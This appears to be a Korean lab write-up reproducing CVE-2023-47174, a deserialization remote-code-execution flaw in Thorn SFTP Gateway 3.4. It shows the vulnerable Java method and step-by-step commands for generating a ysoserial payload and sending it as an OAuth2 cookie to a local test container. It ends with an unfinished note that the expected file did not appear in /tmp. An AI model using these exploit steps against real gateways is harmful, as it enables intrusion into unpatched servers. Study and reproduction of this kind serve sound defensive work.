## 1. 취약점 개요

**제목:** Thorn SFTP Gateway 3.4 직렬화 취약점으로 인한 원격 코드 실행 (CVE-2023-47174)

Thorn SFTP Gateway(버전 3.4.0–3.4.3)가 Spring의 `SerializationUtils`를 사용해 신뢰할 수 없는 데이터를 역직렬화함으로써 원격 코드 실행이 가능한 취약점입니다. 버전 3.4.4으로 업그레이드하여 패치 할 수 있다.

참고 문헌

1. https://nvd.nist.gov/vuln/detail/CVE-2023-47174?utm_source=chatgpt.com
2. [Praetorian write-up “Every Rose Has Its Thorn SFTP Gateway](https://www.praetorian.com/blog/every-rose-has-its-thorn-sftp-gateway/)
3. https://www.praetorian.com/blog/every-rose-has-its-thorn-sftp-gateway/

---

## 2. 환경 구성

다음과 같이 한 줄만으로 PoC 애플리케이션을 빌드·실행할 수 있습니다:

```bash
docker compose up -d --build
```

컨테이너가 기동되면, 웹브라우저(또는 curl)에서 아래 URL에 접속해 엔드포인트가 살아있는지 확인하세요:

```
http://localhost:8080/backend/login/oauth2/code/anything
```

![image.png](attachment:9863d780-9ed3-4720-a50b-61de637c5582:image.png)

별도의 로그인 화면 없이 `"No exploit cookie found."` 메시지가 보이면 정상 구동된 것입니다.

---

## 3. 취약점 분석

관리 코드(`HttpCookieOAuth2AuthorizationRequestRepository`)에 정의된 내부 메서드:

```java
private OAuth2AuthorizationRequest deserialize(String data) {
    byte[] bytes = Base64.getUrlDecoder().decode(data);
    return SerializationUtils.deserialize(bytes);
}
```

`SerializationUtils.deserialize()`가 내부적으로 `ObjectInputStream.readObject()`를 호출하며, 공격자가 제어하는 데이터를 역직렬화하게 됩니다. 

Spring 공식 문서에서도 이 유틸리티 사용 시 다음과 같은 주의를 권고합니다:

> “WARNING: These utilities should be used with caution.”
> 

---

## 4. 익스플로잇

### 익스플로잇 바이너리 생성

```bash
docker run --rm -v "${PWD}:/workspace" -w /workspace maven:3.8-jdk-11 mvn clean package
```

![image.png](attachment:f4ee8e97-c182-466e-a34e-e3e94e307f76:image.png)

### 익스플로잇 + base64 인코딩

```c
docker run --rm -v "${PWD}:/workspace" -w /workspace openjdk:11-jre-slim java -cp "target/payload-generator-shaded.jar:lib/ysoserial-all.jar" com.example.generator.PayloadGenerator
```

![image.png](attachment:9add9b35-48b4-47ec-9f4e-a5cf029844d1:image.png)

## curl 사용으로 PoC 요청(익스플로잇) 보내기

```bash
curl.exe -v -H "Cookie: oauth2_authorization_request=복사한_payload" "http://localhost:8080/backend/login/oauth2/code/anything"

```

![image.png](attachment:98c31271-0830-4f12-9c7a-e04e72a1ee43:image.png)

- PoC 컨테이너(localhost:8080)에 익스플로잇 페이로드를 쿠키로 전송합니다.
- 응답이 `500 Internal Server Error`여도 역직렬화 시도가 성공한 것입니다.

/tmp에 안생겨